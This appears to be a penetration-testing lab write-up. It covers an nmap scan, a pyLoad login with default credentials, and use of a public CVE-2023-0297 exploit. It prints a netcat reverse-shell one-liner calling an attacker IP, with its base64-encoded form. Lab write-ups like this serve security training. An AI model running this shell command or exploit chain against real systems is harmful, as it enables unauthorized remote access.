## First enumeration with nmap 

```shell
# Nmap 7.94SVN scan initiated Fri Mar  1 12:46:33 2024 as: nmap -sC -sV -T4 -oN normal.txt -p 22,9666 -Pn 192.168.227.26
Nmap scan report for 192.168.227.26
Host is up (0.14s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
|_  256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
9666/tcp open  http    CherryPy wsgiserver
| http-title: Login - pyLoad 
|_Requested resource was /login?next=http://192.168.227.26:9666/
|_http-server-header: Cheroot/8.6.0
| http-robots.txt: 1 disallowed entry 
|_/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Mar  1 12:47:12 2024 -- 1 IP address (1 host up) scanned in 39.11 seconds

```

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/c949fe8b-9f09-414b-bed9-f5a7e3590965)

a web server running on port `9666`, opening it on a browser, we got to see it is running `pyload` service. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/a0f22bcd-f8fa-408d-92fb-cb9e10eb6890)

a lil research on default creds, we got `pyload:pyload`. and we login success.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/c9b280b5-3e3f-4509-b04a-f6cddb215cc3)

found an exploit on github, [exploit](https://github.com/JacobEbben/CVE-2023-0297). 

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.218 443 >/tmp/f

cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL2Jhc2ggLWkgMj4mMXxuYyAxOTIuMTY4LjQ1LjIxOCA0NDMgPi90bXAvZg==
```
encoded the reverse shell to base64. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/532394bf-8e29-4782-9528-09b0b2d83054)

run the reverse shell. and we got shell

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/7a842a12-cf80-45a1-b295-728584f7c455)

and we are through 🙂
